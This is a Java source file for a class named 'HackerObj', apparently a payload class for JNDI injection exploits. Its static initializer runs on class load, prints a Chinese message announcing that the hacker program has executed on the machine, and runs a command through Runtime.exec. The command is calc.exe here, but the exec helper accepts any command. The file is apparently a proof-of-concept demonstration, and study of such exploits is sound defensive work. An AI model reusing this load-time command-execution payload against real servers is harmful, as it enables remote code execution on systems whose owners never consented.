import javax.lang.model.element.Name;
import javax.naming.Context;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;

/**
 * HackerObj
 * Created by luliru on 1/4/22.
 */

public class HackerObj {
    public static void exec(String cmd) throws IOException {
        String sb = "";
        BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(bufferedInputStream));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null) {
            sb += lineStr + "\n";

        }
        inBr.close();
        inBr.close();
    }

    public Object getObjectInstance(Object obj, Name name,
                                    Context context, HashMap<?, ?> environment) throws Exception {
        return null;
    }

    static {
        try {
            System.out.println("黑客程序在此机器被执行了。");
            exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

